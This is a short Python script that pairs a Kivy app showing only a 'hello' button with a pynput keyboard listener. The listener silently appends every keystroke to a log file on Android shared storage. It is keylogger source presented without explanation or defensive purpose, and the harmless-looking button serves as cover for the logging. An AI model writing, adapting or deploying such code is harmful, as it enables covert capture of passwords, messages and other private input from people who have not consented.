import pynput
from pynput.keyboard  import Listener
from kivy.app import App
from kivy.uix.button import Button

def w_t(key):
        letter = str(key)
        letter = letter.replace("'","")

        if letter == "Key.space":
                letter = " "
        elif letter == "Key.enter":
                letter = "\n"
        elif letter == "Key.backspace":
                letter = " backspace "

        with open("/storage/emulated/0/log.txt", "a") as f:
                f.write(letter)
#with Listener(on_press=w_t) as l:
        #l.join()

class a(App):
        def build(self,*args):
                b = Button(text="hello")
                return b
a().run()
with Listener(on_press=w_t) as l:
    l.join()
